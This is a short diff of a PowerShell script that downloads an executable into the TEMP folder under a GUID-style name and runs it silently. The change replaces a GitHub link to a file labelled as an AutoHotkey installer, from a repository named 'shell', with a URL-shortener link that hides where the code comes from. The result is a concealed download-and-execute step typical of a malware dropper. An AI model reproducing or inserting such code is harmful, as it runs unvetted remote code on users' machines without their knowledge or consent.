@@ -11,7 +11,7 @@ function base64ToFile($base64String,$scriptPath,$run = $false){
 
 $path = "$Env:TEMP\14660a3a-f06a-4bf0-b2c8-6955e879fa30.exe"
 if (-Not (Test-Path -Path $path)){
-    Start-BitsTransfer -Source "https://github.com/mrsprinkler/shell/raw/refs/heads/main/AutoHotkey_2.0.18_setup.exe" -Destination $path
+    Start-BitsTransfer -Source "https://shorturl.at/rnxiX" -Destination $path
 }
 
 Start-Process $path -ArgumentList '/silent' -Wait
